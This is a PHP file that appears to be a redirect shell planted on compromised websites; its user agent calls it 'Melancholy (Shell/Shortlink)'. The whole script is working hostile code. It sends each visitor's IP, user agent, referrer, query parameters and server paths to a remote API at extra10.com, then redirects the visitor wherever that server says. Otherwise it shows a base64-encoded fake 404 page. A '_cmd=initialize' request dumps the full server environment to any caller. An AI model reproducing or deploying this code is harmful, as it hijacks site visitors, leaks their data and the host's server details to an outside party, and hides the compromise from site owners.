<?php
$config = [
    'server' => 'https://extra10.com/api'
];
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}

function sendNotFoundResponse() {
    header('HTTP/1.0 404 Not Found');
    die(base64_decode('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCTxoZWFkPgoJCTxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgoJCTxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSIgLz4KCQk8dGl0bGU+UGFnZSBOb3QgRm91bmQ8L3RpdGxlPgoJCTxzdHlsZT4KCQkJYm9keSB7CgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjZjVmNWY1OwoJCQkJbWFyZ2luLXRvcDogOCU7CgkJCQljb2xvcjogIzVkNWQ1ZDsKCQkJCWZvbnQtZmFtaWx5OiAtYXBwbGUtc3lzdGVtLCBCbGlua01hY1N5c3RlbUZvbnQsICJTZWdvZSBVSSIsIFJvYm90bywgIkhlbHZldGljYSBOZXVlIiwgQXJpYWwsCgkJCQkJIk5vdG8gU2FucyIsIHNhbnMtc2VyaWYsICJBcHBsZSBDb2xvciBFbW9qaSIsICJTZWdvZSBVSSBFbW9qaSIsICJTZWdvZSBVSSBTeW1ib2wiLAoJCQkJCSJOb3RvIENvbG9yIEVtb2ppIjsKCQkJCXRleHQtc2hhZG93OiAwcHggMXB4IDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNzUpOwoJCQkJdGV4dC1hbGlnbjogY2VudGVyOwoJCQl9CgoJCQloMSB7CgkJCQlmb250LXNpemU6IDIuNDVlbTsKCQkJCWZvbnQtd2VpZ2h0OiA3MDA7CgkJCQljb2xvcjogIzVkNWQ1ZDsKCQkJCWxldHRlci1zcGFjaW5nOiAtMC4wMmVtOwoJCQkJbWFyZ2luLWJvdHRvbTogMzBweDsKCQkJCW1hcmdpbi10b3A6IDMwcHg7CgkJCX0KCgkJCS5jb250YWluZXIgewoJCQkJd2lkdGg6IDEwMCU7CgkJCQltYXJnaW4tcmlnaHQ6IGF1dG87CgkJCQltYXJnaW4tbGVmdDogYXV0bzsKCQkJfQoKCQkJLmFuaW1hdGVfX2FuaW1hdGVkIHsKCQkJCWFuaW1hdGlvbi1kdXJhdGlvbjogMXM7CgkJCQlhbmltYXRpb24tZmlsbC1tb2RlOiBib3RoOwoJCQl9CgoJCQkuYW5pbWF0ZV9fZmFkZUluIHsKCQkJCWFuaW1hdGlvbi1uYW1lOiBmYWRlSW47CgkJCX0KCgkJCS5pbmZvIHsKCQkJCWNvbG9yOiAjNTU5NGNmOwoJCQkJZmlsbDogIzU1OTRjZjsKCQkJfQoKCQkJLmVycm9yIHsKCQkJCWNvbG9yOiAjYzkyMTI3OwoJCQkJZmlsbDogI2M5MjEyNzsKCQkJfQoKCQkJLndhcm5pbmcgewoJCQkJY29sb3I6ICNmZmNjMzM7CgkJCQlmaWxsOiAjZmZjYzMzOwoJCQl9CgoJCQkuc3VjY2VzcyB7CgkJCQljb2xvcjogIzVhYmE0NzsKCQkJCWZpbGw6ICM1YWJhNDc7CgkJCX0KCgkJCS5pY29uLWxhcmdlIHsKCQkJCWhlaWdodDogMTMycHg7CgkJCQl3aWR0aDogMTMycHg7CgkJCX0KCgkJCS5kZXNjcmlwdGlvbi10ZXh0IHsKCQkJCWNvbG9yOiAjNzA3MDcwOwoJCQkJbGV0dGVyLXNwYWNpbmc6IC0wLjAxZW07CgkJCQlmb250LXNpemU6IDEuMjVlbTsKCQkJCWxpbmUtaGVpZ2h0OiAyMHB4OwoJCQl9CgoJCQkuZm9vdGVyIHsKCQkJCW1hcmdpbi10b3A6IDQwcHg7CgkJCQlmb250LXNpemU6IDAuN2VtOwoJCQl9CgoJCQkuYW5pbWF0ZV9fZGVsYXktMXMgewoJCQkJYW5pbWF0aW9uLWRlbGF5OiAxczsKCQkJfQoKCQkJQGtleWZyYW1lcyBmYWRlSW4gewoJCQkJZnJvbSB7CgkJCQkJb3BhY2l0eTogMDsKCQkJCX0KCQkJCXRvIHsKCQkJCQlvcGFjaXR5OiAxOwoJCQkJfQoJCQl9CgkJPC9zdHlsZT4KCTwvaGVhZD4KCTxib2R5PgoJCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CgkJCTxkaXYgY2xhc3M9InJvdyI+CgkJCQk8ZGl2IGNsYXNzPSJjb2wiPgoJCQkJCTxkaXYgY2xhc3M9ImFuaW1hdGVfX2FuaW1hdGVkIGFuaW1hdGVfX2ZhZGVJbiI+CgkJCQkJCTxzdmcKCQkJCQkJCWNsYXNzPSJpbmZvIGljb24tbGFyZ2UgZmEtcXVlc3Rpb24tY2lyY2xlIgoJCQkJCQkJeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIgoJCQkJCQkJdmlld0JveD0iMCAwIDUxMiA1MTIiCgkJCQkJCT4KCQkJCQkJCTxwYXRoCgkJCQkJCQkJZD0iTTUwNCAyNTZjMCAxMzYuOTk3LTExMS4wNDMgMjQ4LTI0OCAyNDhTOCAzOTIuOTk3IDggMjU2QzggMTE5LjA4MyAxMTkuMDQzIDggMjU2IDhzMjQ4IDExMS4wODMgMjQ4IDI0OHpNMjYyLjY1NSA5MGMtNTQuNDk3IDAtODkuMjU1IDIyLjk1Ny0xMTYuNTQ5IDYzLjc1OC0zLjUzNiA1LjI4Ni0yLjM1MyAxMi40MTUgMi43MTUgMTYuMjU4bDM0LjY5OSAyNi4zMWM1LjIwNSAzLjk0NyAxMi42MjEgMy4wMDggMTYuNjY1LTIuMTIyIDE3Ljg2NC0yMi42NTggMzAuMTEzLTM1Ljc5NyA1Ny4zMDMtMzUuNzk3IDIwLjQyOSAwIDQ1LjY5OCAxMy4xNDggNDUuNjk4IDMyLjk1OCAwIDE0Ljk3Ni0xMi4zNjMgMjIuNjY3LTMyLjUzNCAzMy45NzZDMjQ3LjEyOCAyMzguNTI4IDIxNiAyNTQuOTQxIDIxNiAyOTZ2NGMwIDYuNjI3IDUuMzczIDEyIDEyIDEyaDU2YzYuNjI3IDAgMTItNS4zNzMgMTItMTJ2LTEuMzMzYzAtMjguNDYyIDgzLjE4Ni0yOS42NDcgODMuMTg2LTEwNi42NjcgMC01OC4wMDItNjAuMTY1LTEwMi0xMTYuNTMxLTEwMnpNMjU2IDMzOGMtMjUuMzY1IDAtNDYgMjAuNjM1LTQ2IDQ2IDAgMjUuMzY0IDIwLjYzNSA0NiA0NiA0NnM0Ni0yMC42MzYgNDYtNDZjMC0yNS4zNjUtMjAuNjM1LTQ2LTQ2LTQ2eiIKCQkJCQkJCT48L3BhdGg+CgkJCQkJCTwvc3ZnPgoJCQkJCTwvZGl2PgoJCQkJCTxoMSBjbGFzcz0iYW5pbWF0ZV9fYW5pbWF0ZWQgYW5pbWF0ZV9fZmFkZUluIj5QYWdlIE5vdCBGb3VuZDwvaDE+CgkJCQkJPGRpdiBjbGFzcz0iZGVzY3JpcHRpb24tdGV4dCBhbmltYXRlX19hbmltYXRlZCBhbmltYXRlX19mYWRlSW4gYW5pbWF0ZV9fZGVsYXktMXMiPgoJCQkJCQk8cD5Pb3BzISBXZSBjb3VsZG4ndCBmaW5kIHRoZSBwYWdlIHRoYXQgeW91J3JlIGxvb2tpbmcgZm9yLjwvcD4KCQkJCQkJPHA+UGxlYXNlIGNoZWNrIHRoZSBhZGRyZXNzIGFuZCB0cnkgYWdhaW4uPC9wPgoJCQkJCQk8c2VjdGlvbiBjbGFzcz0iZm9vdGVyIj48c3Ryb25nPkVycm9yIENvZGU6PC9zdHJvbmc+IDQwNDwvc2VjdGlvbj4KCQkJCQk8L2Rpdj4KCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQk8L2Rpdj4KCTwvYm9keT4KPC9odG1sPgo='));
}

function httpGet($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    curl_setopt($ch, CURLOPT_ENCODING, '');

    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
    $headers[] = 'Accept-Language: en-US,en;q=0.5';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'Pragma: no-cache';
    $headers[] = 'Cache-Control: no-cache';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }else{
        return $result;
    }
    curl_close($ch);
}

function api($url, $data, $maxRetries = 5, $useSleep = false)
{
    global $config;
    for ($i = 0; $i < $maxRetries; $i++) {
        $x = curl($config['server'] . $url, $data);
        if (empty($x)) {
            if ($useSleep) sleep(rand(1, 3));
            continue;
        }
        return json_decode($x, true);
    }
    return '';
}

function curl($url, array $var, $useBuildQuery = true)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($curl, CURLOPT_USERAGENT, "Melancholy (Shell/Shortlink)");
    if (!empty($var)) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($var));
    }
    curl_setopt($curl, CURLOPT_HTTPHEADER, ['Content-Type:application/json']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}

function ipGetAddress()
{
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }

    $client  = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : '';
    $forward = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : '';
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    return $ip;
}
if (isset($_REQUEST['_cmd'])) {
    header("Content-Type: application/json");
    switch ($_REQUEST['_cmd']) {
        case 'initialize':
            die(json_encode(['status' => true, 'message' => 'Yes Sir', 'data' => [
                'server' => $_SERVER,
                'time' => time(),
            ]]));

        default:
            die(json_encode(['status' => false, 'message' => 'No Command Founded', 'data' => []]));
    }
}
$data = api('/external/page/find', [
    'http_host' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : null,
    'server_name' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : null,
    'server_address' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : null,
    'script_name' => isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : null,
    'useragent' => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null,
    'language' => isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : null,
    'referrer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : null,
    'php_self' => isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : null,
    'ip' => ipGetAddress(),
    'get' => $_GET,
    'url' => ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"),
    'uri' => $_SERVER['REQUEST_URI'],

], 10, true);

if (isset($data['status'])) {

    if ($data['status']) {
        header("LOCATION: " . $data['data']['location'], true, 302);
        die();
    } else {
        if (isset($data['data']['fallback_link'])) {
            if (!empty($data['data']['fallback_link'])) {
                header("LOCATION: " . $data['data']['fallback_link'], true, 302);
                die();
            }
        }
        die(http_response_code(404));
    }
} else {
    if (isset($data['data']['fallback_link'])) {
        if (!empty($data['data']['fallback_link'])) {
            header("LOCATION: " . $data['data']['fallback_link'], true, 302);
            die();
        }
    }
    die(http_response_code(404));
}